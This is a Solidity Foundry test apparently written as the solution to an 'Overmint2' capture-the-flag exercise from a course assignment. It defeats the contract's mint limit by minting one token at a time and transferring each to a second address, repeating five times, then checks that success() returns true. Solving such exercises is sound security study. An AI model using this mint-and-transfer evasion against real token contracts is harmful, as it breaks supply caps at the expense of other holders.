// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {Overmint2} from "../../../../src/Week2/Assignments/CTF/Overmint2.sol";

contract Overmint2Test is Test {
    Overmint2 public overmint2;

    function setUp() public {
        overmint2 = new Overmint2();
    }

    function testMint() public {
        overmint2.mint();
        overmint2.transferFrom(address(this), address(2), 1);
        overmint2.mint();
        overmint2.transferFrom(address(this), address(2), 2);
        overmint2.mint();
        overmint2.transferFrom(address(this), address(2), 3);
        overmint2.mint();
        overmint2.transferFrom(address(this), address(2), 4);
        overmint2.mint();
        overmint2.transferFrom(address(this), address(2), 5);
        vm.prank(address(2));
        assertEq(overmint2.success(), true);
    }
}
